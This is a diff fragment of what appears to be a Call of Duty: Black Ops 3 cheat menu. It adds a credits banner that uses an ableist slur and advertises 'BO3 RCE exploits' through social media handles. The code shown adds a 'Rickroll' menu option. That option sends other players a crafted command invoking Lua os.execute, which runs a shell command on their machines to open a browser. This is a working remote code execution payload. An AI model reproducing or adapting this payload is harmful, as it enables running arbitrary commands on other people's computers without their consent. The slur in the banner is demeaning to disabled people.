@@ -1,3 +1,13 @@
+Credits: Lerggy (aka. God, our lord and savior)
+
+This is proof that anything can be done even if you are a retard.
+
+Contact Info:
+Discord: Lerggy#0477
+
+For Latest BO3 RCE Exploits Follow my InstaGram: LERGGYMADEUHISBITCH
+
+
 if (ImGui::Selectable("Rickroll"))
 						{
 							CL_AddReliableCommand(0, "ui os.execute(str:\"start /max https://www.youtube.com/watch?v=dQw4w9WgXcQ\",);");
